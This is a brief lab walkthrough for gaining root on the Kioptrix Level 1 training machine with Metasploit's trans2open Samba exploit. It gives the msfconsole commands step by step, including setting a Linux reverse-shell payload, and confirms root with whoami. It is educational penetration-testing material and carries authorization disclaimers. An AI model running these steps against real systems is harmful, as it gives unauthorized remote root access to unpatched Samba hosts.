# Kioptrix Level 1 - Exploitation (Gaining Root with Metasploit)

## Overview
This guide provides instructions for exploiting the Kioptrix Level 1 machine to gain root access using Metasploit. This is for educational purposes and should only be done in a controlled environment with proper authorization.

## Exploitation Steps

1. Start Metasploit by running the following command:
   ```bash
   msfconsole
   ```

2. Search for the trans2open exploit:
   ```bash
   search trans2open
   ```

3. Select the appropriate exploit (e.g., Linux x86) using its module number:
   ```bash
   use <module_number>
   ```

4. Set the target IP address as the RHOSTS:
   ```bash
   set RHOSTS 192.168.30.128
   ```

5. Check the available options and configure the exploit if needed:
   ```bash
   options
   ```

6. Set the payload to gain a reverse shell:
   ```bash
   set payload linux/x86/shell_reverse_tcp
   ```

7. Run the exploit:
   ```bash
   exploit
   ```

8. Once the exploit is successful, you will have a command shell session open. Verify that you have root access:
   ```bash
   whoami
   hostname
   ```

9. You should see `root` as the user and `kioptrix.level1` as the hostname, indicating that you have gained root access to the Kioptrix Level 1 machine.

## Additional Notes
- Ensure that you have permission to perform these actions on the target machine.
- Always use ethical hacking practices and do not use these techniques on unauthorized systems.
